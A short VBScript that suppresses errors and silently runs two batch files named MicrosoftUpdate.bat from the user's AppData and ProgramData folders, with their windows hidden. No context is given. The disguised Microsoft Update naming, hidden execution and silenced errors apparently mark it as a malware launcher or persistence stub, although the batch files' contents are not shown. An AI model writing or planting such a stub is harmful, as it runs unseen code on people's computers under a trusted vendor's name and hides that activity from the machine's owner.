On Error Resume Next
Set WshShell = WScript.CreateObject( "WScript.Shell" )
WshShell.Run "%APPDATA%\MicrosoftUpdate\MicrosoftUpdate.bat",0,True
WshShell.Run "%PROGRAMDATA%\MicrosoftUpdate\MicrosoftUpdate.bat",0,True